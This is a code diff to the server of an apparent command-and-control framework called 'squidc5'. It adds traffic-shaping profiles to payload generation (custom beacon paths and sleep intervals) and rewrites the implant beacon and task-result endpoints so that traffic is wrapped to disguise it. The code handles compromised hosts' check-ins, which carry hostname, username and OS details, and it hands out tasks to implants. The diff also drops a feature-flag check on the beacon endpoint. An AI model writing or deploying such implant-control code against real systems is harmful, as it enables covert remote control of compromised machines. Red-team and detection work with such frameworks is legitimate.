@@ -44,6 +44,7 @@ class PayloadRequest(BaseModel):
     host: str
     port: int
     interval: int = 5
+    profile_id: str | None = None
 
 
 class LLMConfig(BaseModel):
@@ -415,9 +416,32 @@ def build_api_router() -> APIRouter:
         if not decision.allowed:
             raise HTTPException(403, decision.reason)
         try:
+            prof = None
+            if body.profile_id:
+                prof = state.profiles.get(body.profile_id)
+                if not prof:
+                    raise HTTPException(404, "profile not found")
+            else:
+                prof = state.profiles.active()
+            plan: dict[str, Any] = {}
+            session_path = "/api/v1/implant/beacon"
+            interval = body.interval
+            if prof and body.template.startswith("http_beacon"):
+                plan = state.profiles.implant_snippet(prof, body.host, body.port)
+                if plan.get("channel") == "http" and plan.get("uri"):
+                    session_path = plan["uri"]
+                if plan.get("sleep_sec"):
+                    interval = int(max(1, round(float(plan["sleep_sec"]))))
             result = state.payloads.generate(
-                template=body.template, host=body.host, port=body.port, interval=body.interval
+                template=body.template,
+                host=body.host,
+                port=body.port,
+                session_path=session_path,
+                interval=interval,
+                extra=plan,
             )
+        except HTTPException:
+            raise
         except ValueError as e:
             raise HTTPException(400, str(e)) from e
         await state.metrics.incr("payloads.generated")
@@ -938,47 +962,45 @@ def build_api_router() -> APIRouter:
     implant = APIRouter(prefix="/implant", tags=["implant"])
 
     @implant.post("/beacon")
-    async def beacon(body: BeaconIn, request: Request) -> dict[str, Any]:
+    async def beacon(request: Request):
+        from fastapi.responses import Response as FastResponse
+
+        from squidc5.profiles.http_beacon import process_beacon_checkin
+
         state = get_state(request)
-        if not await state.features.enabled("implant_beacon"):
-            raise HTTPException(403, "Implant beacon is disabled by feature flag")
+        pe = state.profiles
+        prof = pe.active()
+        raw = await request.body()
+        payload = pe.unwrap_request_body(prof, raw)
         client = request.client.host if request.client else None
-        if body.session_id:
-            existing = await state.sessions.get(body.session_id)
-            if existing and existing["status"] == "active":
-                await state.sessions.heartbeat(
-                    body.session_id,
-                    hostname=body.hostname,
-                    username=body.username,
-                    os_info=body.os_info,
-                )
-                sid = body.session_id
-            else:
-                sid = await state.sessions.register(
-                    kind="beacon",
-                    remote_addr=client,
-                    hostname=body.hostname,
-                    username=body.username,
-                    os_info=body.os_info,
-                    metadata=body.metadata,
-                )
-        else:
-            sid = await state.sessions.register(
-                kind="beacon",
+        try:
+            result = await process_beacon_checkin(
+                state,
                 remote_addr=client,
-                hostname=body.hostname,
-                username=body.username,
-                os_info=body.os_info,
-                metadata=body.metadata,
+                payload=payload if isinstance(payload, dict) else {},
+                user_agent=request.headers.get("user-agent"),
             )
-        task = await state.tasks.poll(sid)
-        return {"session_id": sid, "task": task}
+        except PermissionError as e:
+            raise HTTPException(403, str(e)) from e
+        return FastResponse(content=pe.wrap_response(prof, result), media_type="application/json")
 
     @implant.post("/beacon/result")
-    async def beacon_result(body: TaskResultIn, request: Request) -> dict[str, str]:
-        state = get_state(request)
-        await state.tasks.complete(body.task_id, body.result, body.status)
-        return {"status": "ok"}
+    async def beacon_result(request: Request):
+        from fastapi.responses import Response as FastResponse
 
+        from squidc5.profiles.http_beacon import process_beacon_result
+
+        state = get_state(request)
+        pe = state.profiles
+        prof = pe.active()
+        raw = await request.body()
+        payload = pe.unwrap_request_body(prof, raw)
+        try:
+            result = await process_beacon_result(
+                state, payload if isinstance(payload, dict) else {}
+            )
+        except ValueError as e:
+            raise HTTPException(400, str(e)) from e
+        return FastResponse(content=pe.wrap_response(prof, result), media_type="application/json")
     api.include_router(implant)
     return api
